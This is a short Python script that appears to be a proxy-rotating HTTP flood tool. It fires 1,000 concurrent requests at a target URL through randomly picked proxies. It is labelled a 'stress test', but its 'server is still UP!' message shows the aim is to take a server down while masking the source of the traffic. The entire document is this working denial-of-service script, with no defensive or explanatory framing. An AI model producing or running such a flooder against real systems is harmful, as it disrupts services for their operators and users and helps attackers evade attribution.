import asyncio
import aiohttp
import random

# list of proxies
proxies = [
    "http://proxy1:port",
    "http://proxy2:port",
    "http://proxy3:port",
    # ...
]

# target server
target_url = "http://example.com"

# number of requests to send
num_requests = 1000

# function to send a single request
async def send_request(session, proxy):
    try:
        async with session.get(target_url, proxy=proxy) as response:
            if response.status != 200:
                print(f"[STILLUP] Request SENT but the server is still UP! {response.status}")
            else:
                print(f"[SUCCESS] Request sent successfully")
    except Exception as e:
        print(f"[ERROR] Request failed with exception: {e}")

# function to start the stress test
async def start_stress_test():
    # create a session
    async with aiohttp.ClientSession() as session:
        # create a list of tasks
        tasks = [send_request(session, random.choice(proxies)) for _ in range(num_requests)]
        # run the tasks in parallel
        await asyncio.gather(*tasks)

# start the stress test
asyncio.run(start_stress_test())
